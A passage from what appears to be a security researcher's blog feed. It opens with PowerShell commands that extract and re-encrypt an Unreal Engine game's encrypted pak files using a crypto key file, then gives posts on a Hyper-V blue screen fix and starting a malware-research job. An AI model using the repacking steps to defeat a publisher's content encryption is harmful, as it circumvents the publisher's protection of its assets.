</span><span class="o">.</span><span class="n">\UnrealPak.exe</span><span class="w"> </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">userprofile</span><span class="s2">\Desktop\DUMP\REDACTED\Content\Paks\REDACTED-WinGDK.pak"</span><span class="w"> </span><span class="nt">-Extract</span><span class="w"> </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">userprofile</span><span class="s2">\Desktop\DUMP_PAK"</span><span class="w"> </span><span class="nt">-CryptoKeys</span><span class="o">=</span><span class="s2">"Crypto.json"</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="n">output.log</span><span class="w">
</span><span class="c"># do the string replacement here yourself; I always did it by hand with regular expression in VSC.</span><span class="w">
</span><span class="c"># repackage the file based on our existing crypto key and file list then launch the game</span><span class="w">
</span><span class="n">cd</span><span class="w"> </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">programfiles</span><span class="s2">\Epic Games\UE_4.25\Engine\Binaries\Win64\"</span><span class="p">;</span><span class="w"> </span><span class="o">.</span><span class="n">\UnrealPak.exe</span><span class="w"> </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">userprofile</span><span class="nx">\Desktop\DUMP\REDACTED\Content\Paks\REDACTED-WinGDK.pak</span><span class="w"> </span><span class="nt">-Create</span><span class="o">=</span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">userprofile</span><span class="s2">\Downloads\UnrealPakTool\output.log"</span><span class="w"> </span><span class="nt">-Encrypt</span><span class="w"> </span><span class="nt">-cryptokeys</span><span class="o">=</span><span class="s2">"Crypto.json"</span><span class="p">;</span><span class="w"> </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">userprofile</span><span class="n">\Desktop\DUMP\REDACTED\Binaries\WinGDK\REDACTED-WinGDK-Shipping.exe</span><span class="w">
</span></code></pre></div></div>

<p>Have fun modding the game with Shrek or something absolutely memey!</p>

<h2 id="conclusion">Conclusion</h2>

<p>In this post, we went through how Unreal uses a SHA-1 hash as its AES key to decrypt its content, and how we can dump the said content into its decrypted form. This was a fun exercise for me, as I was truly passionate about discovering more about this game and I wanted to see just how familiar I am with the x64dbg debugger now that I have a full-time job that requires me to work with debugger every day.</p>

<p>While I had fun decrypting and dumping the game and discovering previously uncertain information about the mechanics, there were a few things that disappointed me. First of all, I realized the game chose to opt for Wwise’s proprietary compressed audio instead of the uncompressed format. The compression is the equivalent of 192kbps MP3 with a very noticeable 18KHz cut-off. That is what I call a yikes for a game that has its focus on audio. Second, the fact that the developers had unfortunately signed a Microsoft exclusivity contract meant that they had to roll out the game using the MSIX format - a format that I will make a rant on some time after the publication of this post.</p>

<p><a href="/assets/images/posts/unreal-pak/5ec952c4701a6fced03c7973cc2a5aa87b4d7695ec8f382c4c40f9baa5fed2d7.png"><img class="lazy align-center" src="/generated/assets/images/posts/unreal-pak/5ec952c4701a6fced03c7973cc2a5aa87b4d7695ec8f382c4c40f9baa5fed2d7-600-638ed0620.png" srcset="/generated/assets/images/posts/unreal-pak/5ec952c4701a6fced03c7973cc2a5aa87b4d7695ec8f382c4c40f9baa5fed2d7-600-638ed0620.png 1.0x, /generated/assets/images/posts/unreal-pak/5ec952c4701a6fced03c7973cc2a5aa87b4d7695ec8f382c4c40f9baa5fed2d7-900.0-638ed0620.png 1.5x, /generated/assets/images/posts/unreal-pak/5ec952c4701a6fced03c7973cc2a5aa87b4d7695ec8f382c4c40f9baa5fed2d7-1200-638ed0620.png 2.0x"></a></p>

<p>Ah well, that about wraps up this post, though! Thanks for reading and going through this journey with me!</p>]]></content><author><name>Still Hsu</name><email>business@stillu.cc</email></author><category term="infosec" /><category term="en-us" /><summary type="html"><![CDATA[When you *really* want a game's soundtrack, but the publisher hasn't released them yet.]]></summary></entry><entry><title type="html">The Mysterious SYSTEM_THREAD_EXCEPTION_NOT_HANDLED and Hyper-V</title><link href="https://stillu.cc/misc/2020/11/16/mystery-bsod-system-thread-exception-not-handled-amd/" rel="alternate" type="text/html" title="The Mysterious SYSTEM_THREAD_EXCEPTION_NOT_HANDLED and Hyper-V" /><published>2020-11-16T00:00:00+08:00</published><updated>2020-11-16T00:00:00+08:00</updated><id>https://stillu.cc/misc/2020/11/16/mystery-bsod-system-thread-exception-not-handled-amd</id><content type="html" xml:base="https://stillu.cc/misc/2020/11/16/mystery-bsod-system-thread-exception-not-handled-amd/"><![CDATA[<h2 id="tldr">TL;DR</h2>

<p>If the BSoD happened after enabling Hyper-V-related features, <em>and</em> if you are on an AMD platform, disable AMD PSS in the BIOS.</p>

<p class="notice--warning">Disabling Memory Integrity supposedly works too, but <strong>NOT RECOMMENDED</strong> for security reasons.</p>

<h2 id="the-story">The Story</h2>

<p>My weekend could have been a lot smoother this week. Here’s the story: I’ve been using Hyper-V ever since WSL 2 was first introduced to the Windows 10 preview builds. Since running a hypervisor (VMware layer) inside another hypervisor (Hyper-V layer) is not exactly ideal performance-wise, I figured I might as well give Hyper-V a try.</p>

<p><a href="/assets/images/posts/e722c7e01dd42b7e3b8729e2b56697c334c3f6281a07ab9997b35696410af0e5.png"><img class="lazy align-center" src="/generated/assets/images/posts/e722c7e01dd42b7e3b8729e2b56697c334c3f6281a07ab9997b35696410af0e5-600-c55d34f98.png" srcset="/generated/assets/images/posts/e722c7e01dd42b7e3b8729e2b56697c334c3f6281a07ab9997b35696410af0e5-600-c55d34f98.png 1.0x, /generated/assets/images/posts/e722c7e01dd42b7e3b8729e2b56697c334c3f6281a07ab9997b35696410af0e5-900.0-c55d34f98.png 1.5x, /generated/assets/images/posts/e722c7e01dd42b7e3b8729e2b56697c334c3f6281a07ab9997b35696410af0e5-1200-c55d34f98.png 2.0x"></a></p>

<p>Fast forward to yesterday. I was setting up a Windows 7 Hyper-V instance for my malware lab at home. During the setup, I figured I’d add my on-board Wi-Fi module as an External VM Hyper-V Switch.</p>

<p>…annnnd I couldn’t. I keep running into this mysterious <code class="language-plaintext highlighter-rouge">Element not found</code> and <code class="language-plaintext highlighter-rouge">Folder already exists</code> error. Looking it up, I had tried everything from <code class="language-plaintext highlighter-rouge">netcfg -d</code> to reinstalling the network driver - nothing worked. Great.</p>

<p><a href="/assets/images/posts/3bb00caa35e52b5f699c90910bdabd07bd3fc0d1cde0ee72431603d0407bd42a.png"><img class="lazy align-center" src="/generated/assets/images/posts/3bb00caa35e52b5f699c90910bdabd07bd3fc0d1cde0ee72431603d0407bd42a-600-aad7a001c.png" srcset="/generated/assets/images/posts/3bb00caa35e52b5f699c90910bdabd07bd3fc0d1cde0ee72431603d0407bd42a-600-aad7a001c.png 1.0x, /generated/assets/images/posts/3bb00caa35e52b5f699c90910bdabd07bd3fc0d1cde0ee72431603d0407bd42a-829-aad7a001c.png 1.38x"></a></p>

<p>As a last resort, I tried the nuke approach: re-install the Hyper-V feature on my Windows 10 20H2 (19042.630) installation by disabling and re-enabling the Hyper-V and its related Windows features (i.e., <code class="language-plaintext highlighter-rouge">Hyper-V</code>, <code class="language-plaintext highlighter-rouge">Virtual Machine Platform</code>, <code class="language-plaintext highlighter-rouge">Windows Hypervisor Platform</code>, <code class="language-plaintext highlighter-rouge">Windows Subsystem for Linux</code>, <code class="language-plaintext highlighter-rouge">Microsoft Defender Application Guard</code>). And that was where my trouble got even worse.</p>

<p>After re-enabling the features, my Windows couldn’t even reach the Windows loading screen without this pesky <code class="language-plaintext highlighter-rouge">SYSTEM_THREAD_EXCEPTION_NOT_HANDLED</code> BSoD.</p>

<p><a href="/assets/images/posts/3f4359142bf87d749b0a5cf2b756e3be7afd66699d7cdf9bce12702f807d7e74.png"><img class="lazy align-center" src="/generated/assets/images/posts/3f4359142bf87d749b0a5cf2b756e3be7afd66699d7cdf9bce12702f807d7e74-600-676eb5a75.png" srcset="/generated/assets/images/posts/3f4359142bf87d749b0a5cf2b756e3be7afd66699d7cdf9bce12702f807d7e74-600-676eb5a75.png 1.0x, /generated/assets/images/posts/3f4359142bf87d749b0a5cf2b756e3be7afd66699d7cdf9bce12702f807d7e74-900.0-676eb5a75.png 1.5x, /generated/assets/images/posts/3f4359142bf87d749b0a5cf2b756e3be7afd66699d7cdf9bce12702f807d7e74-1024-676eb5a75.png 1.71x"></a></p>

<p>At this point I was like, “Welp, I guess my system is just cursed.” I didn’t even bother troubleshooting beyond the basic “let’s enter safe mode and see if that works” and “let’s see what the Internet has to say” steps. Since I already have regular backups (<em>you should too</em>), reinstalling Windows really wasn’t that big of a deal to me; might as well just do it then.</p>

<p><a href="/assets/images/posts/aca24a4af39768458fd3034667ae0f451975142b5c7e0e3dbdd13ba4f181a193.jpg"><img class="lazy align-center" src="/generated/assets/images/posts/aca24a4af39768458fd3034667ae0f451975142b5c7e0e3dbdd13ba4f181a193-600-49ce7b5e6.jpg" srcset="/generated/assets/images/posts/aca24a4af39768458fd3034667ae0f451975142b5c7e0e3dbdd13ba4f181a193-600-49ce7b5e6.jpg 1.0x, /generated/assets/images/posts/aca24a4af39768458fd3034667ae0f451975142b5c7e0e3dbdd13ba4f181a193-900.0-49ce7b5e6.jpg 1.5x, /generated/assets/images/posts/aca24a4af39768458fd3034667ae0f451975142b5c7e0e3dbdd13ba4f181a193-1200-49ce7b5e6.jpg 2.0x"></a></p>

<p>After reinstalling Windows 20H2 (<em>after like an hour or two of getting the latest Windows ISO, thanks Microsoft for throttling the traffic</em>) and getting my most essential programs set up, I went ahead and enabled Hyper-V features again.</p>

<p><a href="/assets/images/posts/37488bb1b84a7ff265ea968c2a1d64a6af25623a3c00c2ebd3dad9c0ef7a9b02.png"><img class="lazy align-center" src="/generated/assets/images/posts/37488bb1b84a7ff265ea968c2a1d64a6af25623a3c00c2ebd3dad9c0ef7a9b02-600-536f2eb8f.png" srcset="/generated/assets/images/posts/37488bb1b84a7ff265ea968c2a1d64a6af25623a3c00c2ebd3dad9c0ef7a9b02-600-536f2eb8f.png 1.0x, /generated/assets/images/posts/37488bb1b84a7ff265ea968c2a1d64a6af25623a3c00c2ebd3dad9c0ef7a9b02-694-536f2eb8f.png 1.16x"></a></p>

<p>…annnnd we’re back to this blue screen crap.</p>

<p>Thankfully, a Microsoft employee on the PowerShell Discord that I visit regularly suggested that it was a known issue on some platforms, particularly, Lenovo laptops with biometric passthrough. Initially I didn’t really buy into that suggestion, as it seemed like a niche Lenovo-related incident, but he did suggest turning off virtualization features in the BIOS to see if it would help. Disabling AMD SVM (the AMD equivalent of Intel VT-d) did allow me to boot back into Windows. Upon getting past the loading screen, Windows noticed the installed features aren’t working as intended and rolled back the features.</p>

<p>That’s great and all, but… I kinda need SVM if I want to use any software that utilize hardware virtualization at all! Since the person on Discord mentioned that it was “certain features” causing this BSoD, I decided to try to pinpoint the issue myself. I first tried disabling certain CPU features that I knew I wasn’t using or explicitly required to be on, then I enabled Windows Features one by one, instead of enabling all at once. Everything booted. Okay cool.</p>

<p>Let’s try re-enabling AMD PSS, one of the features I disabled. And ladies and gentlemen, that was it! This non-descriptive feature with a vaguely technical description was causing the issue. I can’t imagine why ACPI-related features would lead to this bizarre issue, but more importantly - whoever in charge of writing the feature description over at ASUS needs to revise them. I have <em>no idea</em> what any of that meant without consulting AMD’s tech specs.</p>

<p><a href="/assets/images/posts/24fceb358766c2eaeecf139b8e69776dd3688d801ccb8b71802eab2823d6dfce.jpg"><img class="lazy align-center" src="/generated/assets/images/posts/24fceb358766c2eaeecf139b8e69776dd3688d801ccb8b71802eab2823d6dfce-600-a6be72cf7.jpg" srcset="/generated/assets/images/posts/24fceb358766c2eaeecf139b8e69776dd3688d801ccb8b71802eab2823d6dfce-600-a6be72cf7.jpg 1.0x, /generated/assets/images/posts/24fceb358766c2eaeecf139b8e69776dd3688d801ccb8b71802eab2823d6dfce-900.0-a6be72cf7.jpg 1.5x, /generated/assets/images/posts/24fceb358766c2eaeecf139b8e69776dd3688d801ccb8b71802eab2823d6dfce-1200-a6be72cf7.jpg 2.0x"></a></p>

<p>By the way, the Wi-Fi bridging VM switch thing? Still doesn’t work after a reinstall. Thanks Microsoft. I swear, VMware seems more than reliable at this rate.</p>]]></content><author><name>Still Hsu</name><email>business@stillu.cc</email></author><category term="misc" /><category term="en-us" /><summary type="html"><![CDATA[AMD PSS + Hyper-V = F]]></summary></entry><entry><title type="html">A New Chapter in Life</title><link href="https://stillu.cc/personal/2020/10/25/new-chapter-of-life/" rel="alternate" type="text/html" title="A New Chapter in Life" /><published>2020-10-25T00:00:00+08:00</published><updated>2020-10-25T00:00:00+08:00</updated><id>https://stillu.cc/personal/2020/10/25/new-chapter-of-life</id><content type="html" xml:base="https://stillu.cc/personal/2020/10/25/new-chapter-of-life/"><![CDATA[<h2 id="applying-for-work">Applying for Work</h2>

<p>In search for a new job for my future <em>(and for my wallet)</em>, I applied for a little company in Taiwan called TeamT5 back in late September. TeamT5 provides threat analysis and incident response services for enterprises, which happens to align with my interest of information security.</p>

<p><a href="/assets/images/posts/new-chapter-work/843d58e332871a279ebca7edfe6c54fac66c802e700e40ce0d0c66baa4030b8e.png"><img class="lazy align-center" src="/generated/assets/images/posts/new-chapter-work/843d58e332871a279ebca7edfe6c54fac66c802e700e40ce0d0c66baa4030b8e-600-f208a67b4.png" srcset="/generated/assets/images/posts/new-chapter-work/843d58e332871a279ebca7edfe6c54fac66c802e700e40ce0d0c66baa4030b8e-600-f208a67b4.png 1.0x, /generated/assets/images/posts/new-chapter-work/843d58e332871a279ebca7edfe6c54fac66c802e700e40ce0d0c66baa4030b8e-900.0-f208a67b4.png 1.5x, /generated/assets/images/posts/new-chapter-work/843d58e332871a279ebca7edfe6c54fac66c802e700e40ce0d0c66baa4030b8e-1200-f208a67b4.png 2.0x"></a></p>

<p>I applied for the Vulnerability Researcher position, which I thought was fitting at the time - even though I haven’t really found anything of my own as of yet. I won’t delve too much into the actual interview itself, as part of the interview process is under a non-disclosure agreement (NDA). But suffice to say, I passed the interview and their test with flying color (though I was certainly quite anxious before and during the interview process). However, instead of offering me the Vulnerability Researcher position I initially applied for, we’ve come to the agreement that I’m much more suited for the Malware Research division. In retrospect, malware research makes far more sense given my interest in malware and APT attacks around the globe.</p>

<figure class="half">
<a href="/assets/images/posts/new-chapter-work/f04d461c0282674b327c3bfa26c43a65a1cdbb036fe60a04869f1710b1e9c6a5.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/new-chapter-work/f04d461c0282674b327c3bfa26c43a65a1cdbb036fe60a04869f1710b1e9c6a5-400-fbad167c9.webp 400w, /generated/assets/images/posts/new-chapter-work/f04d461c0282674b327c3bfa26c43a65a1cdbb036fe60a04869f1710b1e9c6a5-600-fbad167c9.webp 600w, /generated/assets/images/posts/new-chapter-work/f04d461c0282674b327c3bfa26c43a65a1cdbb036fe60a04869f1710b1e9c6a5-800-fbad167c9.webp 800w, /generated/assets/images/posts/new-chapter-work/f04d461c0282674b327c3bfa26c43a65a1cdbb036fe60a04869f1710b1e9c6a5-1000-fbad167c9.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/new-chapter-work/f04d461c0282674b327c3bfa26c43a65a1cdbb036fe60a04869f1710b1e9c6a5-400-4b68e4fd0.jpg 400w, /generated/assets/images/posts/new-chapter-work/f04d461c0282674b327c3bfa26c43a65a1cdbb036fe60a04869f1710b1e9c6a5-600-4b68e4fd0.jpg 600w, /generated/assets/images/posts/new-chapter-work/f04d461c0282674b327c3bfa26c43a65a1cdbb036fe60a04869f1710b1e9c6a5-800-4b68e4fd0.jpg 800w, /generated/assets/images/posts/new-chapter-work/f04d461c0282674b327c3bfa26c43a65a1cdbb036fe60a04869f1710b1e9c6a5-1000-4b68e4fd0.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/new-chapter-work/f04d461c0282674b327c3bfa26c43a65a1cdbb036fe60a04869f1710b1e9c6a5-800-4b68e4fd0.jpg" width="4032" height="3024" />
  </picture>
</a>
  
<a href="/assets/images/posts/new-chapter-work/7fcf29560e4be11e0d43ac9a958887d06d77d4838b7c5ef539e91738178539c0.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/new-chapter-work/7fcf29560e4be11e0d43ac9a958887d06d77d4838b7c5ef539e91738178539c0-400-db7123006.webp 400w, /generated/assets/images/posts/new-chapter-work/7fcf29560e4be11e0d43ac9a958887d06d77d4838b7c5ef539e91738178539c0-600-db7123006.webp 600w, /generated/assets/images/posts/new-chapter-work/7fcf29560e4be11e0d43ac9a958887d06d77d4838b7c5ef539e91738178539c0-800-db7123006.webp 800w, /generated/assets/images/posts/new-chapter-work/7fcf29560e4be11e0d43ac9a958887d06d77d4838b7c5ef539e91738178539c0-1000-db7123006.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/new-chapter-work/7fcf29560e4be11e0d43ac9a958887d06d77d4838b7c5ef539e91738178539c0-400-c175362c8.jpg 400w, /generated/assets/images/posts/new-chapter-work/7fcf29560e4be11e0d43ac9a958887d06d77d4838b7c5ef539e91738178539c0-600-c175362c8.jpg 600w, /generated/assets/images/posts/new-chapter-work/7fcf29560e4be11e0d43ac9a958887d06d77d4838b7c5ef539e91738178539c0-800-c175362c8.jpg 800w, /generated/assets/images/posts/new-chapter-work/7fcf29560e4be11e0d43ac9a958887d06d77d4838b7c5ef539e91738178539c0-1000-c175362c8.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/new-chapter-work/7fcf29560e4be11e0d43ac9a958887d06d77d4838b7c5ef539e91738178539c0-800-c175362c8.jpg" width="4032" height="3024" />
  </picture>
</a>
  
    <figcaption>On my way to the bustling city of Taipei.</figcaption>
</figure>

<h2 id="conscription-and-moving">Conscription and Moving</h2>

<p>Unfortunately, as of the time of writing this article, I still haven’t resolved my conscription complications. Long story short, <a href="https://en.wikipedia.org/wiki/Conscription_in_Taiwan">Taiwan has a mandatory military duty for all biologically-born-male residents</a>. I have applied for a conscription immunity with my mental illness, which unfortunately has taken quite a long time to resolve due to various complications from the hospital and general government inefficiency. The local district office has told me that it is very likely to pass, though I’ll have to wait for the results in November.</p>

<p>Anyways, all that trouble means I cannot apply for a full-time position at the moment, as it is illegal to do so with an unattended conscription duty. However, the company has given me a contractor role, which is perfectly legal as far as we know. This means that I’ll be paid slightly lower and cannot yet become a full-time employee as of now, but at least I’ll still be paid at least 80% of the full-time salary.</p>

<p>With the interview passed, that does mean I have to move to at least somewhere near the vicinity of the workplace. Well, “near.” I originally intended to rent a house or an apartment somewhere near the company. Given how little money I had on hand, though, I didn’t feel comfortable renting a place - especially not in downtown Taipei, where the rent is usually ridiculously high. Thankfully, I was offered a place to stay at my relative’s, which while isn’t <em>close</em> to where my work is, it is at least within <em>reasonable</em> distance.</p>

<p>My dad and my step-mom were honestly the heroes doing the work helping me move. They helped me move to the apartment near my university, to their home after my school life ends, and now, to this new place that’s at least 300 km (~185 mi) away from theirs. Even though I had fewer things to bring (had to leave my collections at home 😭), it was still at least a carful of stuff. Not only that, they <em>chose</em> to personally drive all this stuff up there with me, which was real dedication.</p>

<p>After I arrived, I was greeted with a spacious room for me to live in. Seriously, I did not expect was how nice the room and the area is (after some cleaning).</p>

<figure class="half">
    <a href="/assets/images/posts/new-chapter-work/f81c2e1082da1265a0a6f9f5e8e2f276b8e3d26fc41afcc8eb7f068acecb6b02.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/new-chapter-work/f81c2e1082da1265a0a6f9f5e8e2f276b8e3d26fc41afcc8eb7f068acecb6b02-400-bc2e9ca00.webp 400w, /generated/assets/images/posts/new-chapter-work/f81c2e1082da1265a0a6f9f5e8e2f276b8e3d26fc41afcc8eb7f068acecb6b02-600-bc2e9ca00.webp 600w, /generated/assets/images/posts/new-chapter-work/f81c2e1082da1265a0a6f9f5e8e2f276b8e3d26fc41afcc8eb7f068acecb6b02-800-bc2e9ca00.webp 800w, /generated/assets/images/posts/new-chapter-work/f81c2e1082da1265a0a6f9f5e8e2f276b8e3d26fc41afcc8eb7f068acecb6b02-1000-bc2e9ca00.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/new-chapter-work/f81c2e1082da1265a0a6f9f5e8e2f276b8e3d26fc41afcc8eb7f068acecb6b02-400-7ba2b722c.jpg 400w, /generated/assets/images/posts/new-chapter-work/f81c2e1082da1265a0a6f9f5e8e2f276b8e3d26fc41afcc8eb7f068acecb6b02-600-7ba2b722c.jpg 600w, /generated/assets/images/posts/new-chapter-work/f81c2e1082da1265a0a6f9f5e8e2f276b8e3d26fc41afcc8eb7f068acecb6b02-800-7ba2b722c.jpg 800w, /generated/assets/images/posts/new-chapter-work/f81c2e1082da1265a0a6f9f5e8e2f276b8e3d26fc41afcc8eb7f068acecb6b02-1000-7ba2b722c.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/new-chapter-work/f81c2e1082da1265a0a6f9f5e8e2f276b8e3d26fc41afcc8eb7f068acecb6b02-800-7ba2b722c.jpg" width="4032" height="3024" />
  </picture>
</a>

    <a href="/assets/images/posts/new-chapter-work/5038b3f28dd731fe7cf29ec39f28122113eb134331f8d797e72a6551e364fa57.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/new-chapter-work/5038b3f28dd731fe7cf29ec39f28122113eb134331f8d797e72a6551e364fa57-400-e2d171427.webp 400w, /generated/assets/images/posts/new-chapter-work/5038b3f28dd731fe7cf29ec39f28122113eb134331f8d797e72a6551e364fa57-600-e2d171427.webp 600w, /generated/assets/images/posts/new-chapter-work/5038b3f28dd731fe7cf29ec39f28122113eb134331f8d797e72a6551e364fa57-800-e2d171427.webp 800w, /generated/assets/images/posts/new-chapter-work/5038b3f28dd731fe7cf29ec39f28122113eb134331f8d797e72a6551e364fa57-1000-e2d171427.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/new-chapter-work/5038b3f28dd731fe7cf29ec39f28122113eb134331f8d797e72a6551e364fa57-400-22165bde7.jpg 400w, /generated/assets/images/posts/new-chapter-work/5038b3f28dd731fe7cf29ec39f28122113eb134331f8d797e72a6551e364fa57-600-22165bde7.jpg 600w, /generated/assets/images/posts/new-chapter-work/5038b3f28dd731fe7cf29ec39f28122113eb134331f8d797e72a6551e364fa57-800-22165bde7.jpg 800w, /generated/assets/images/posts/new-chapter-work/5038b3f28dd731fe7cf29ec39f28122113eb134331f8d797e72a6551e364fa57-1000-22165bde7.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/new-chapter-work/5038b3f28dd731fe7cf29ec39f28122113eb134331f8d797e72a6551e364fa57-800-22165bde7.jpg" width="4032" height="3024" />
  </picture>
</a>

    <figcaption>It's everything I could have only dreamed of!</figcaption>
</figure>

<p>It took me an entire day to sort things out and buy the essential stuff all over again (I had to get a vacuum cleaner because of the dust - it had been a while since someone last stepped in that room it seemed), but I managed to do it. Oh, and no internet for now, so I’m typing this on my tethered network with poor signal. Woo. I can’t wait to get cable internet sorted out. No fiber unfortunately.</p>

<h2 id="what-work-is-actually-like">What Work is Actually Like</h2>

<p>Shortly after moving in, I was called to the job. First day at the work was… confusing and anxiety-inducing to say the least - especially how I had to also deal with working out the perfect commute to the workplace. I cannot go into too much detail of the job just in case I accidentally spill any insider info. What I can say is it’s not too different with what a malware researcher might do at home, but a lot more streamlined and enterprise-y. Basically, dynamic and/or static test the sample, write a report, and move on. At the time of writing this post, it’s only the end of the first week of my job, so I’m still figuring things out as I go. I only just got commute figured out on Day 4 and am still not too sure how I should go about writing my reports, but I’m hanging in there.</p>

<figure class="third">
<a href="/assets/images/posts/new-chapter-work/3191e2c7d3c6028a46c01491dcd16abf370122b76c91b3acabca1377add6b5c9.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/new-chapter-work/3191e2c7d3c6028a46c01491dcd16abf370122b76c91b3acabca1377add6b5c9-400-d272ffc9b.webp 400w, /generated/assets/images/posts/new-chapter-work/3191e2c7d3c6028a46c01491dcd16abf370122b76c91b3acabca1377add6b5c9-600-d272ffc9b.webp 600w, /generated/assets/images/posts/new-chapter-work/3191e2c7d3c6028a46c01491dcd16abf370122b76c91b3acabca1377add6b5c9-800-d272ffc9b.webp 800w, /generated/assets/images/posts/new-chapter-work/3191e2c7d3c6028a46c01491dcd16abf370122b76c91b3acabca1377add6b5c9-1000-d272ffc9b.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/new-chapter-work/3191e2c7d3c6028a46c01491dcd16abf370122b76c91b3acabca1377add6b5c9-400-7caeb9082.jpg 400w, /generated/assets/images/posts/new-chapter-work/3191e2c7d3c6028a46c01491dcd16abf370122b76c91b3acabca1377add6b5c9-600-7caeb9082.jpg 600w, /generated/assets/images/posts/new-chapter-work/3191e2c7d3c6028a46c01491dcd16abf370122b76c91b3acabca1377add6b5c9-800-7caeb9082.jpg 800w, /generated/assets/images/posts/new-chapter-work/3191e2c7d3c6028a46c01491dcd16abf370122b76c91b3acabca1377add6b5c9-1000-7caeb9082.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/new-chapter-work/3191e2c7d3c6028a46c01491dcd16abf370122b76c91b3acabca1377add6b5c9-800-7caeb9082.jpg" width="4032" height="3024" />
  </picture>
</a>
  
<a href="/assets/images/posts/new-chapter-work/418fc4a9a5c4ffb12bc9ff2573b86556c220822cd6be671e9ce92c2f75d4bf73.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/new-chapter-work/418fc4a9a5c4ffb12bc9ff2573b86556c220822cd6be671e9ce92c2f75d4bf73-400-c71baa80e.webp 400w, /generated/assets/images/posts/new-chapter-work/418fc4a9a5c4ffb12bc9ff2573b86556c220822cd6be671e9ce92c2f75d4bf73-600-c71baa80e.webp 600w, /generated/assets/images/posts/new-chapter-work/418fc4a9a5c4ffb12bc9ff2573b86556c220822cd6be671e9ce92c2f75d4bf73-800-c71baa80e.webp 800w, /generated/assets/images/posts/new-chapter-work/418fc4a9a5c4ffb12bc9ff2573b86556c220822cd6be671e9ce92c2f75d4bf73-1000-c71baa80e.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/new-chapter-work/418fc4a9a5c4ffb12bc9ff2573b86556c220822cd6be671e9ce92c2f75d4bf73-400-e236f9374.jpg 400w, /generated/assets/images/posts/new-chapter-work/418fc4a9a5c4ffb12bc9ff2573b86556c220822cd6be671e9ce92c2f75d4bf73-600-e236f9374.jpg 600w, /generated/assets/images/posts/new-chapter-work/418fc4a9a5c4ffb12bc9ff2573b86556c220822cd6be671e9ce92c2f75d4bf73-800-e236f9374.jpg 800w, /generated/assets/images/posts/new-chapter-work/418fc4a9a5c4ffb12bc9ff2573b86556c220822cd6be671e9ce92c2f75d4bf73-1000-e236f9374.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/new-chapter-work/418fc4a9a5c4ffb12bc9ff2573b86556c220822cd6be671e9ce92c2f75d4bf73-800-e236f9374.jpg" width="4032" height="3024" />
  </picture>
</a>
  
<a href="/assets/images/posts/new-chapter-work/cc4767bfef89babd1e5eafed163e08dfaf5c660965dc68613d8d1df32903abf1.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/new-chapter-work/cc4767bfef89babd1e5eafed163e08dfaf5c660965dc68613d8d1df32903abf1-400-1c446db02.webp 400w, /generated/assets/images/posts/new-chapter-work/cc4767bfef89babd1e5eafed163e08dfaf5c660965dc68613d8d1df32903abf1-600-1c446db02.webp 600w, /generated/assets/images/posts/new-chapter-work/cc4767bfef89babd1e5eafed163e08dfaf5c660965dc68613d8d1df32903abf1-800-1c446db02.webp 800w, /generated/assets/images/posts/new-chapter-work/cc4767bfef89babd1e5eafed163e08dfaf5c660965dc68613d8d1df32903abf1-1000-1c446db02.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/new-chapter-work/cc4767bfef89babd1e5eafed163e08dfaf5c660965dc68613d8d1df32903abf1-400-a72a38544.jpg 400w, /generated/assets/images/posts/new-chapter-work/cc4767bfef89babd1e5eafed163e08dfaf5c660965dc68613d8d1df32903abf1-600-a72a38544.jpg 600w, /generated/assets/images/posts/new-chapter-work/cc4767bfef89babd1e5eafed163e08dfaf5c660965dc68613d8d1df32903abf1-800-a72a38544.jpg 800w, /generated/assets/images/posts/new-chapter-work/cc4767bfef89babd1e5eafed163e08dfaf5c660965dc68613d8d1df32903abf1-1000-a72a38544.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/new-chapter-work/cc4767bfef89babd1e5eafed163e08dfaf5c660965dc68613d8d1df32903abf1-800-a72a38544.jpg" width="4032" height="3024" />
  </picture>
</a>
  
<figcaption>Oh yeah, I found this cool mart near my workplace! They've got cheese and everything! Taiwan doesn't have a whole lot of dairy products so this is awesome!</figcaption>
</figure>

<p>Now, as for the stuff I’m kind of iffy about this week: work life balance and colleagues.</p>

<p>Work/life balance had always been something that only a Taiwan university student can only talk and or fantasize about when they’re not working a full-time position yet. As much as some courses would want students to discuss their views on work/life balance, the views are often unrealistic in retrospect - even though it’s only been about a week since I started working. My work is relatively simple compared to full-time construction workers or Taiwanese convenience store clerks (seriously, they are expected to do <em>everything</em> around here; check out <a href="https://topics.amcham.com.tw/2019/08/country-of-convenience/">A Country of Convenience - Taiwan Business</a> if you don’t understand the saturated market of convenience store in Taiwan). We’ve got great work benefits like free snacks and beverages and flexible hours. All great on paper - until I actually started working. 8 hours a day spent at the computer <em>really</em> isn’t that exciting. Besides, given the long commute hours, it means that I’m more or less not home from 7am to 8pm. The long hours mean that I’ll likely be exhausted at the end of the day and have very few hours for entertainment. Indeed, I don’t do a whole lot after work’s started anymore. Granted, I <em>am</em> doing some of that entertainment on-the-go like 